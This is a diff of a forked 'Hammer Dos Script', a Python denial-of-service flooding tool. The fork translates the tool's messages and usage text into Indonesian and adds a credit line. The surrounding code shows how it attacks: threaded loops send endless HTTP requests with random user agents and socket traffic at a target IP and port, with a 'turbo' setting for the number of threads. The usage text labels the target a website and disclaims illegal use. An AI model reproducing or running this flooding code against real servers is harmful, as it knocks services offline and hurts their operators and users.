@@ -4,6 +4,8 @@
 # python 3.3.2+ Hammer Dos Script v.1
 # by Can Yalçın
 # only for legal purpose
+# =============
+# fork and edit devs by Internsial Node
 
 
 from queue import Queue
@@ -35,7 +37,7 @@ def bot_hammering(url):
 	try:
 		while True:
 			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
-			print("\033[94mbot is hammering...\033[0m")
+			print("\033[94mBot lagi menyerang\033[0m")
 			time.sleep(.1)
 	except:
 		time.sleep(.1)
@@ -55,7 +57,7 @@ def down_it(item):
 				print("\033[91mshut<->down\033[0m")
 			time.sleep(.1)
 	except socket.error as e:
-		print("\033[91mno connection! server maybe down\033[0m")
+		print("\033[91mGaada koneksi, Server sepertinya sudah tumbang\033[0m")
 		#print("\033[91m",e,"\033[0m")
 		time.sleep(.1)
 
@@ -75,13 +77,13 @@ def dos2():
 
 
 def usage():
-	print (''' \033[92m	Hammer Dos Script v.1 http://www.canyalcin.com/
+	print (''' \033[92m	Hammer Dos Script v.6
 	It is the end user's responsibility to obey all applicable laws.
 	It is just for server testing script. Your ip is visible. \n
-	usage : python3 hammer.py [-s] [-p] [-t]
-	-h : help
-	-s : server ip
-	-p : port default 80
+	Cara menulis : python3 hammer.py [-s] [-p] [-t]
+	-h : Pertolongan
+	-s : server ip (Website target)
+	-p : port defaultnya 80
 	-t : turbo default 135 \033[0m''')
 	sys.exit()
 
@@ -130,7 +132,7 @@ if __name__ == '__main__':
 		usage()
 	get_parameters()
 	print("\033[92m",host," port: ",str(port)," turbo: ",str(thr),"\033[0m")
-	print("\033[94mPlease wait...\033[0m")
+	print("\033[94mTunggu sebentar...\033[0m")
 	user_agent()
 	my_bots()
 	time.sleep(5)
@@ -139,7 +141,7 @@ if __name__ == '__main__':
 		s.connect((host,int(port)))
 		s.settimeout(1)
 	except socket.error as e:
-		print("\033[91mcheck server ip and port\033[0m")
+		print("\033[91mCek internet atau coba cek server target atau ip\033[0m")
 		usage()
 	while True:
 		for i in range(int(thr)):
